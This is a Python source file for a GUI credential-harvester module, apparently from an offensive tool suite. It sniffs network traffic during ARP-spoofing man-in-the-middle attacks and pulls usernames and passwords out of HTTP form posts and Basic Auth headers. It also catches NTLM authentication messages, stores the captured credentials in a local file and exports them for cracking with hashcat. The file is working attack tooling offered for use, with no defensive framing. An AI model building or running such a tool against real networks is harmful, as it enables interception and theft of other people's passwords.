"""
Credential Harvester — captures credentials from live traffic during MITM.

Two capture modes run simultaneously:
1. HTTP form harvester  — Scapy sniffs TCP/80 for POST bodies containing
                          password-like fields (login forms, Basic Auth headers).
2. NTLM hash catcher    — listens for NTLM challenge/response auth exchanges
                          (SMB, HTTP NTLM) and extracts the NTLMv2 hash string
                          ready to feed into hashcat / PAS.

Captured credentials are stored in ~/.cybersuite/creds.json and displayed
in a live table. One-click export to a text file hashcat can read directly.

Requires: scapy, admin/npcap.
"""
from __future__ import annotations

import base64
import json
import pathlib
import re
import threading
import time
from datetime import datetime
from typing import Callable, Optional
from urllib.parse import parse_qs, unquote_plus

import customtkinter as ctk
import tkinter as tk

# ── Palette ───────────────────────────────────────────────────────────────────
_BG      = "#0d1117"
_SURFACE = "#161b22"
_BORDER  = "#30363d"
_HI      = "#c9d1d9"
_LO      = "#8b949e"
_GREEN   = "#238636"
_RED     = "#da3633"
_ORANGE  = "#d97706"
_CYAN    = "#58a6ff"

_CREDS_FILE = pathlib.Path.home() / ".cybersuite" / "creds.json"

# Common form field names that likely contain credentials
_USER_FIELDS = {"user", "username", "login", "email", "mail", "uname",
                "userid", "user_name", "usr", "account", "naam"}
_PASS_FIELDS = {"pass", "password", "passwd", "pwd", "passw", "wachtwoord",
                "secret", "credential", "pass1", "password1", "mot_de_passe"}

# ── Persistence ───────────────────────────────────────────────────────────────

def _load_creds() -> list[dict]:
    try:
        return json.loads(_CREDS_FILE.read_text())
    except Exception:
        return []

def _save_creds(creds: list[dict]) -> None:
    _CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
    _CREDS_FILE.write_text(json.dumps(creds, indent=2))

# ── Packet analysis ───────────────────────────────────────────────────────────

def _parse_http_post(payload: str) -> Optional[dict]:
    """Extract username/password from an HTTP POST body."""
    try:
        params = parse_qs(payload, keep_blank_values=True)
    except Exception:
        return None

    user = pwd = ""
    for k, v in params.items():
        kl = k.lower().strip()
        if kl in _USER_FIELDS and v:
            user = unquote_plus(v[0])
        if kl in _PASS_FIELDS and v:
            pwd = unquote_plus(v[0])

    if pwd:
        return {"user": user or "(unknown)", "password": pwd}
    return None


def _parse_basic_auth(header_block: str) -> Optional[dict]:
    """Extract credentials from HTTP Basic Auth header."""
    m = re.search(r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", header_block, re.I)
    if not m:
        return None
    try:
        decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
        if ":" in decoded:
            user, pwd = decoded.split(":", 1)
            return {"user": user, "password": pwd}
    except Exception:
        pass
    return None


def _parse_ntlm(payload: bytes) -> Optional[str]:
    """
    Detect NTLMv2 authenticate message and return a hashcat-ready string:
    user::domain:challenge:NTHash:NTProofStr...
    This is a simplified heuristic — full NTLM parsing requires tracking
    the challenge from the Type-2 message.
    """
    try:
        ntlm_sig = b"NTLMSSP\x00"
        idx = payload.find(ntlm_sig)
        if idx == -1:
            return None
        msg_type = payload[idx + 8]
        if msg_type != 3:   # Type 3 = Authenticate
            return None
        # Return hex dump as a placeholder — full reconstruction needs
        # the server challenge from the Type-2 packet (tracked by session)
        raw = payload[idx:idx+200].hex()
        return f"NTLMv2-hash-raw:{raw[:60]}…  (capture full session for hashcat format)"
    except Exception:
        return None


# ── Sniffer ───────────────────────────────────────────────────────────────────

class _Sniffer:
    def __init__(self, iface: str,
                 on_cred: Callable[[dict], None],
                 cb: Callable[[str], None]) -> None:
        self._iface   = iface
        self._on_cred = on_cred
        self._cb      = cb
        self._stop    = threading.Event()

    def start(self) -> None:
        t = threading.Thread(target=self._run, daemon=True)
        t.start()

    def stop(self) -> None:
        self._stop.set()

    def _run(self) -> None:
        try:
            from scapy.all import sniff, TCP, Raw, IP  # type: ignore
        except ImportError:
            self._cb("[ERROR] Scapy not available.\n")
            return

        self._cb("[*] Credential sniffer started.\n")

        def _process(pkt):
            if self._stop.is_set():
                return
            if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
                return

            raw_bytes: bytes = bytes(pkt[Raw].load)
            src_ip = pkt[IP].src if pkt.haslayer(IP) else "?"
            dst_ip = pkt[IP].dst if pkt.haslayer(IP) else "?"

            try:
                payload = raw_bytes.decode("utf-8", errors="replace")
            except Exception:
                payload = ""

            # HTTP POST credential check
            if "POST" in payload[:10] or "Authorization:" in payload:
                result = _parse_http_post(payload.split("\r\n\r\n", 1)[-1])
                if result:
                    self._on_cred({
                        "type":   "HTTP Form",
                        "src":    src_ip,
                        "dst":    dst_ip,
                        "user":   result["user"],
                        "secret": result["password"],
                        "time":   datetime.now().strftime("%H:%M:%S"),
                        "raw":    payload[:300],
                    })
                auth = _parse_basic_auth(payload)
                if auth:
                    self._on_cred({
                        "type":   "HTTP Basic Auth",
                        "src":    src_ip,
                        "dst":    dst_ip,
                        "user":   auth["user"],
                        "secret": auth["password"],
                        "time":   datetime.now().strftime("%H:%M:%S"),
                        "raw":    payload[:300],
                    })

            # NTLM check
            ntlm = _parse_ntlm(raw_bytes)
            if ntlm:
                self._on_cred({
                    "type":   "NTLM Hash",
                    "src":    src_ip,
                    "dst":    dst_ip,
                    "user":   "(from hash)",
                    "secret": ntlm,
                    "time":   datetime.now().strftime("%H:%M:%S"),
                    "raw":    raw_bytes[:200].hex(),
                })

        sniff(iface=self._iface,
              filter="tcp",
              prn=_process,
              store=False,
              stop_filter=lambda _: self._stop.is_set(),
              timeout=None)

        self._cb("[*] Credential sniffer stopped.\n")


# ── Page ──────────────────────────────────────────────────────────────────────

class CredsPage(ctk.CTkFrame):

    def __init__(self, master: ctk.CTkFrame, runner,
                 output_cb: Callable[[str], None]) -> None:
        super().__init__(master, fg_color="transparent")
        self._runner  = runner
        self._out     = output_cb
        self._creds   = _load_creds()
        self._sniffer: Optional[_Sniffer] = None
        self._build()

    # ── Layout ────────────────────────────────────────────────────────────────

    def _build(self) -> None:
        hdr = ctk.CTkFrame(self, fg_color="transparent")
        hdr.pack(fill="x", padx=24, pady=(20, 10))
        ctk.CTkLabel(hdr, text="Credential Harvester",
                     font=ctk.CTkFont(size=20, weight="bold")).pack(side="left")
        ctk.CTkLabel(hdr, text="  —  HTTP forms · Basic Auth · NTLM hashes",
                     text_color=_LO, font=ctk.CTkFont(size=12)).pack(side="left")

        # Toolbar
        tb = ctk.CTkFrame(self, fg_color=_SURFACE, corner_radius=8,
                          border_width=1, border_color=_BORDER)
        tb.pack(fill="x", padx=24, pady=(0, 8))

        ctk.CTkLabel(tb, text="Interface:", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=12)
                     ).pack(side="left", padx=(14, 4), pady=8)

        self._iface_var = ctk.StringVar()
        ifaces = self._get_scapy_ifaces()
        self._iface_map = {v: k for k, v in ifaces.items()}
        display_names = list(ifaces.values()) or ["(no interfaces)"]
        if display_names:
            self._iface_var.set(display_names[0])

        ctk.CTkComboBox(tb, variable=self._iface_var,
                        values=display_names, state="readonly", width=220,
                        font=ctk.CTkFont(family="Consolas", size=12)
                        ).pack(side="left", padx=4, pady=8)

        self._start_btn = ctk.CTkButton(
            tb, text="▶  Start Capture", width=140,
            fg_color=_RED, hover_color="#b91c1c",
            font=ctk.CTkFont(size=13, weight="bold"),
            command=self._toggle,
        )
        self._start_btn.pack(side="left", padx=(10, 6), pady=8)

        self._status_lbl = ctk.CTkLabel(
            tb, text="Idle — start capture after beginning ARP spoof",
            text_color=_LO, font=ctk.CTkFont(family="Consolas", size=11))
        self._status_lbl.pack(side="left", padx=8)

        ctk.CTkButton(tb, text="Export hashcat", width=120,
                      fg_color=_SURFACE, hover_color=_BORDER,
                      border_width=1, border_color=_BORDER,
                      text_color=_CYAN, font=ctk.CTkFont(size=11),
                      command=self._export
                      ).pack(side="right", padx=8)

        ctk.CTkButton(tb, text="Clear", width=60,
                      fg_color=_SURFACE, hover_color=_BORDER,
                      border_width=1, border_color=_BORDER,
                      text_color=_LO, font=ctk.CTkFont(size=11),
                      command=self._clear
                      ).pack(side="right", padx=(0, 4))

        # Table
        table_card = ctk.CTkFrame(self, fg_color=_SURFACE, corner_radius=8,
                                  border_width=1, border_color=_BORDER)
        table_card.pack(fill="both", expand=True, padx=24, pady=(0, 8))
        table_card.grid_rowconfigure(1, weight=1)
        table_card.grid_columnconfigure(0, weight=1)

        # Column headers
        hdrs = ctk.CTkFrame(table_card, fg_color="#0d1117", corner_radius=0)
        hdrs.grid(row=0, column=0, sticky="ew")
        for i, (label, w) in enumerate([
            ("Time", 70), ("Type", 130), ("Source", 120),
            ("Username", 160), ("Secret / Hash", 0)
        ]):
            ctk.CTkLabel(hdrs, text=label,
                         font=ctk.CTkFont(family="Consolas", size=10, weight="bold"),
                         text_color=_LO, width=w, anchor="w"
                         ).grid(row=0, column=i, sticky="w",
                                padx=(12 if i == 0 else 4, 4), pady=8)
        hdrs.grid_columnconfigure(4, weight=1)

        self._table = ctk.CTkScrollableFrame(
            table_card, fg_color="transparent")
        self._table.grid(row=1, column=0, sticky="nsew", padx=2, pady=2)
        self._table.grid_columnconfigure(4, weight=1)

        # Detail panel
        detail_card = ctk.CTkFrame(self, fg_color=_SURFACE, corner_radius=8,
                                   border_width=1, border_color=_BORDER,
                                   height=120)
        detail_card.pack(fill="x", padx=24, pady=(0, 16))
        detail_card.pack_propagate(False)
        ctk.CTkLabel(detail_card, text="RAW PACKET  (click a row)",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color=_LO).pack(anchor="w", padx=16, pady=(10, 4))
        self._raw_box = ctk.CTkTextbox(
            detail_card, font=ctk.CTkFont(family="Consolas", size=10),
            fg_color="#010409", text_color=_LO, height=70, state="disabled")
        self._raw_box.pack(fill="x", padx=12, pady=(0, 10))

        self._refresh_table()

    def _get_scapy_ifaces(self) -> dict[str, str]:
        """Returns {scapy_dev_id: friendly_name}."""
        try:
            from scapy.all import conf  # type: ignore
            result = {}
            for dev_id, iface in conf.ifaces.items():
                name = getattr(iface, "name", "") or getattr(iface, "description", "")
                if name and "loopback" not in name.lower():
                    result[dev_id] = name
            return result
        except Exception:
            return {}

    # ── Capture ───────────────────────────────────────────────────────────────

    def _toggle(self) -> None:
        if self._sniffer:
            self._sniffer.stop()
            self._sniffer = None
            self._start_btn.configure(text="▶  Start Capture",
                                      fg_color=_RED, hover_color="#b91c1c")
            self._status_lbl.configure(text="Stopped")
            return

        display = self._iface_var.get()
        iface   = self._iface_map.get(display, display)

        self._sniffer = _Sniffer(iface, self._on_credential, self._out)
        self._sniffer.start()
        self._start_btn.configure(text="◼  Stop Capture",
                                  fg_color=_SURFACE, hover_color=_BORDER)
        self._status_lbl.configure(
            text=f"Capturing on {display}…", text_color="#f85149")

    def _on_credential(self, cred: dict) -> None:
        self._creds.append(cred)
        _save_creds(self._creds)
        self._out(f"[!] CREDENTIAL CAPTURED  [{cred['type']}]"
                  f"  {cred['user']}  :  {cred['secret'][:60]}\n")
        self.after(0, self._refresh_table)

    # ── Table ─────────────────────────────────────────────────────────────────

    def _refresh_table(self) -> None:
        for w in self._table.winfo_children():
            w.destroy()

        if not self._creds:
            ctk.CTkLabel(self._table,
                         text="No credentials captured yet.\n"
                              "Start capture + run ARP spoof to intercept traffic.",
                         text_color=_LO,
                         font=ctk.CTkFont(family="Consolas", size=12)
                         ).pack(pady=30)
            return

        type_colors = {
            "HTTP Form":       "#4ade80",
            "HTTP Basic Auth": _CYAN,
            "NTLM Hash":       _ORANGE,
        }

        for i, c in enumerate(reversed(self._creds)):
            bg = "#0d1117" if i % 2 == 0 else "transparent"
            row = ctk.CTkFrame(self._table, fg_color=bg, corner_radius=4)
            row.pack(fill="x", pady=1)
            row.grid_columnconfigure(4, weight=1)

            tc = type_colors.get(c["type"], _LO)
            for col, (val, w) in enumerate([
                (c["time"], 70), (c["type"], 130), (c["src"], 120),
                (c["user"], 160), (c["secret"][:80], 0)
            ]):
                ctk.CTkLabel(row, text=val,
                             font=ctk.CTkFont(family="Consolas", size=11),
                             text_color=tc if col == 1 else _HI,
                             width=w, anchor="w"
                             ).grid(row=0, column=col, sticky="w",
                                    padx=(12 if col == 0 else 4, 4), pady=6)

            row.bind("<Button-1>", lambda _e, cr=c: self._show_raw(cr))
            for child in row.winfo_children():
                child.bind("<Button-1>", lambda _e, cr=c: self._show_raw(cr))

    def _show_raw(self, cred: dict) -> None:
        self._raw_box.configure(state="normal")
        self._raw_box.delete("0.0", "end")
        self._raw_box.insert("0.0",
            f"Type: {cred['type']}  |  {cred['src']} → {cred['dst']}  |  {cred['time']}\n"
            f"User: {cred['user']}\nSecret: {cred['secret']}\n\nRaw:\n{cred.get('raw','—')}")
        self._raw_box.configure(state="disabled")

    def _export(self) -> None:
        out_path = pathlib.Path.home() / ".cybersuite" / "hashes.txt"
        lines = []
        for c in self._creds:
            if c["type"] == "NTLM Hash":
                lines.append(c["secret"])
            else:
                lines.append(f"{c['user']}:{c['secret']}")
        out_path.write_text("\n".join(lines))
        self.clipboard_clear()
        self.clipboard_append(str(out_path))
        self._out(f"[+] Exported {len(lines)} credential(s) → {out_path}\n")
        self._out("[*] File path copied to clipboard.\n")
        self._out("[*] Feed to hashcat: hashcat -m 5600 hashes.txt wordlist.txt\n")

    def _clear(self) -> None:
        self._creds = []
        _save_creds(self._creds)
        self._refresh_table()
